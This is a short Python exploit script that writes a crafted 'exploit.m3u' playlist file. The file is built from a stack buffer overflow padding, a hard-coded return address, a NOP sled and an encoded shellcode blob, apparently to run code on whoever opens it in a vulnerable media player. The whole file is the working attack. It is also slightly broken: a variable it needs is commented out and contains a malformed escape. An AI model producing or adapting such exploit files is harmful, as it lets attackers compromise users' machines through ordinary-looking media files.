#! /usr/bin/python

#jmp = "\x83\xc3\x64" * 3 + "\ff\xe3"	#add ebx, 64 | jmp ebx


junk = "\x41" * (260 - (len(jmp)))

eip = "\xb2\x59\x93\x3d"

#call ebx=3D9359B2

sploit = jmp + junk + eip
nops = "\x90" * 70

shell = ("\xba\xd5\xf9\x38\x93\xdb\xc0\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x31\x31\x53\x13\x03\x53\x13\x83\xeb\x29\x1b\xcd\x6f\x39\x5e"
"\x2e\x90\xb9\x3f\xa6\x75\x88\x7f\xdc\xfe\xba\x4f\x96\x53\x36"
"\x3b\xfa\x47\xcd\x49\xd3\x68\x66\xe7\x05\x46\x77\x54\x75\xc9"
"\xfb\xa7\xaa\x29\xc2\x67\xbf\x28\x03\x95\x32\x78\xdc\xd1\xe1"
"\x6d\x69\xaf\x39\x05\x21\x21\x3a\xfa\xf1\x40\x6b\xad\x8a\x1a"
"\xab\x4f\x5f\x17\xe2\x57\xbc\x12\xbc\xec\x76\xe8\x3f\x25\x47"
"\x11\x93\x08\x68\xe0\xed\x4d\x4e\x1b\x98\xa7\xad\xa6\x9b\x73"
"\xcc\x7c\x29\x60\x76\xf6\x89\x4c\x87\xdb\x4c\x06\x8b\x90\x1b"
"\x40\x8f\x27\xcf\xfa\xab\xac\xee\x2c\x3a\xf6\xd4\xe8\x67\xac"
"\x75\xa8\xcd\x03\x89\xaa\xae\xfc\x2f\xa0\x42\xe8\x5d\xeb\x08"
"\xef\xd0\x91\x7e\xef\xea\x99\x2e\x98\xdb\x12\xa1\xdf\xe3\xf0"
"\x86\x10\xae\x59\xae\xb8\x77\x08\xf3\xa4\x87\xe6\x37\xd1\x0b"
"\x03\xc7\x26\x13\x66\xc2\x63\x93\x9a\xbe\xfc\x76\x9d\x6d\xfc"
"\x52\xfe\xf0\x6e\x3e\x2f\x97\x16\xa5\x2f")


fill = "C" * (10000-(len(sploit)-len(nops)-len(shell)))


f=open("exploit.m3u","w")
f.write(sploit);
f.write(nops);
f.write(shell);
f.write(fill);
f.close()
